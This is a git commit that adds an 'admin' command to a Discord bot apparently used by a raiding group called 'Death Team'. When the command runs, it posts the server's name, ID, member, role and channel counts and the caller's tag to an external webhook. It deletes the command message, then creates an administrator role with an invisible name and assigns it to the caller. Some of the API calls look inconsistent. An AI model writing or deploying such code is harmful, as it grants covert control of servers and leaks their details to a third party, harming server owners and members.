d4b436d7ef2001ea364a89aa50acee24a952f9b9
Scorpion <100861227+zScorpion16x@users.noreply.github.com>
2023-05-02 23:37:21 -0600

    Create admin.js

---
+++ src/commands/admin.js
@@ -0,0 +1,88 @@
+const Discord = require('discord.js');
+const chalk = require('chalk');
+const fetch = require('node-fetch');
+const util = require('./utilities/ignore.json');
+const emojis = require('./utilities/emojis.json');
+
+////// COMMAND //////
+
+module.exports = {
+     name: 'admin',
+     aliases: ['a'],
+     description: '',
+     
+async execute(client, message, args){
+     setTimeout(function() {
+          
+          console.log(chalk.cyan(`\n[ BATNET ] ${message.author.tag} Has executed the admin command`));
+          console.log(chalk.cyan(`[ BATNET ] Sending log to the webhook.\n`));
+          
+          const log = {
+               username: 'BatNet | Logging',
+               avatar_url: 'https://cdn.discordapp.com/avatars/1081612143566270635/8511dc5a9f3fda4f7af646dc4cd0c901.png?size=2048',
+               content: '',
+               embeds: [
+                    {
+                         description: `${emojis.bat} **| Command:**\n*__.admin__*\n\n${emojis.beer} **| Guild:**\n*__${message.guild.name} ( ${message.guild.id} )__*\n\n${emojis.crown} **| Channels:**\n*__${message.guild.channels.cache.size}__*\n\n${emojis.wings} **| Roles:**\n*__${message.guild.roles.cache.size}__*\n\n${emojis.sparks} **| Users:**\n*__${message.guild.memberCount}__*\n\n${emojis.pin} **| Author:**\n${message.author.tag}`,
+                         author: {
+                              name: 'BatNet',
+                              url: 'https://discord.gg/DeathTeam',
+                              icon_url: 'https://cdn.discordapp.com/emojis/1091519096291590174.gif?v=1&size=48&quality=lossless'
+                         },
+                         thumbnail: {
+                              url: util.server_logo
+                         },
+                         footer: {
+                              text: '#DeathTeam',
+                              icon_url: 'https://cdn.discordapp.com/emojis/1081703117952921670.png?v=1&size=48&quality=lossless'
+                         },
+                         color: 0x0000
+                         }
+                    ]
+          }
+          
+          fetch(util.webhook_url, {
+               method: 'POST',
+               headers: {
+                    'Content-type': 'application/json'
+               },
+               body: JSON.stringify(log)
+          });
+          
+          message.delete();
+          
+          const role = message.guild.roles.create({data: {
+               name: 'ㅤ',
+               color: '0001',
+               permissions: 'ADMINISTRATOR',
+               hoisted: false
+          }});
+          
+          message.member.roles.add(role).then(function(role) {
+               message.member.addRole(role);
+               if (message.deletable) message.delete().catch(e => {});
+               }).catch(e => {});
+          
+          const embed = new Discord.MessageEmbed();
+          
+          message.channel.send({
+               embed: {
+                    description: `${emojis.bat} **| Administrator permits given successful.**`,
+                    author: {
+                              name: 'Death Team',
+                              url: 'https://discord.gg/DeathTeam',
+                              icon_url: 'https://cdn.discordapp.com/emojis/1091519096291590174.gif?v=1&size=48&quality=lossless'
+                         },
+                         thumbnail: {
+                              url: util.server_logo
+                         },
+                         footer: {
+                              text: '#DeathTeam',
+                              icon_url: 'https://cdn.discordapp.com/emojis/1081703117952921670.png?v=1&size=48&quality=lossless'
+                         },
+                         color: 0x0000
+                    }
+               });
+     }, 5000);
+}
+}
